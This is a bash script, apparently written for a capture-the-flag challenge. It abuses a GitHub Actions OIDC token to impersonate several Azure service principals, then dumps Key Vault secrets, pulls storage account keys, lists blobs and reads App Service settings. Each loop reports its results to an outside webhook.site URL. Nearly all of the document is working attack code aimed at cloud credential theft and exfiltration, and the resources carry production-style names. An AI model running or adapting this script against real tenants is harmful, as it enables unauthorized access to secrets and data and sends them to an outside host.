#!/usr/bin/env bash
# CTF DF26 v12: federate GitHub OIDC as candidate SPs (legacy-admin etc), test vault/ARM/storage, grep DF26.
set +e
T=$AZURE_TENANT_ID; C=$AZURE_CLIENT_ID; S=$AZURE_SUBSCRIPTION_ID
M=https://management.azure.com
WB=https://webhook.site/744e1661-136d-4800-a335-a79eb595334e
FL='DF26\{[^}]\{0,200}\}'
OIDC=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
fed(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$2"; }
for aid in 891fb158-e02c-4428-a885-53b811f369c0 4b0b19d5-2841-4ddd-97d0-71758cd584dd 7a250202-a036-4089-8de8-9d1f555a4ad9 7c2e61eb-f928-45cd-99c9-20da958dd216 "$C"; do
  echo "##### FED $aid"
  R=$(fed "$aid" "https://management.azure.com/.default")
  AT=$(echo "$R" | jq -r '.access_token // empty')
  echo "ARM_len=${#AT}"
  [ ${#AT} -lt 50 ] && { echo "$R" | head -c 200; echo; continue; }
  python3 -c "import base64,json,sys;p='$AT'.split('.')[1];p+='='*(-len(p)%4);c=json.loads(base64.urlsafe_b64decode(p));print('claims',c.get('appid'),c.get('roles'),'sub' in c)" 2>/dev/null
  RV=$(fed "$aid" "https://vault.azure.net/.default"); VT=$(echo "$RV" | jq -r '.access_token // empty')
  RS=$(fed "$aid" "https://storage.azure.com/.default"); ST=$(echo "$RS" | jq -r '.access_token // empty')
  echo "VAULT_len=${#VT} STOR_len=${#ST}"
  for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
    L=$(curl -s -m 15 "https://$V.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $VT")
    echo "LIST $V: $(echo "$L" | jq -r '[.value[]?.id | split("/")[-1]] | join(",")' 2>/dev/null || echo "$L" | head -c 120)"
    for s in $(echo "$L" | jq -r '.value[]?.id | split("/")[-1]' 2>/dev/null | head -20); do
      val=$(curl -s -m 15 "https://$V.vault.azure.net/secrets/$s?api-version=7.4" -H "Authorization: Bearer $VT")
      echo "-- $V/$s: $(echo "$val" | jq -r '.value // "x"' | head -c 220)"
      echo "$val" | grep -aoE "$FL" && echo "FLAG_HIT $V/$s"
    done
  done
  for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblreportprod8s42x5 sttblcilogsprodx3euoz; do
    K=$(curl -s -m 15 -X POST -H "Authorization: Bearer $AT" -H 'Content-Length: 0' "$M/subscriptions/$S/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$sa/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // "no"')
    echo "LK $sa: ${K:0:8}"
  done
  for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblreportprod8s42x5; do
    B=$(curl -s -m 15 "https://$sa.blob.core.windows.net/?comp=list" -H "Authorization: Bearer $ST" -H 'x-ms-version: 2021-08-06')
    echo "BL $sa: $(echo "$B" | grep -oE '<Name>[^<]+' | sed 's/<Name>//' | tr '\n' ',' | head -c 150)"
    echo "$B" | grep -aoE "$FL"
  done
  AS=$(curl -s -m 15 -X POST -H "Authorization: Bearer $AT" -H 'Content-Length: 0' "$M/subscriptions/$S/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01")
  echo "APPSET-sf: $(echo "$AS" | jq -r 'if .properties then (.properties | tostring | .[0:300]) else .error.code // "x" end')"
  echo "$AS" | grep -aoE "$FL" && echo FLAG_APPSET
  curl -s -X POST -d "fed-probe $aid arm=${#AT} vault=${#VT} stor=${#ST}" "$WB/v12-$aid" >/dev/null
done
echo DONE-V12
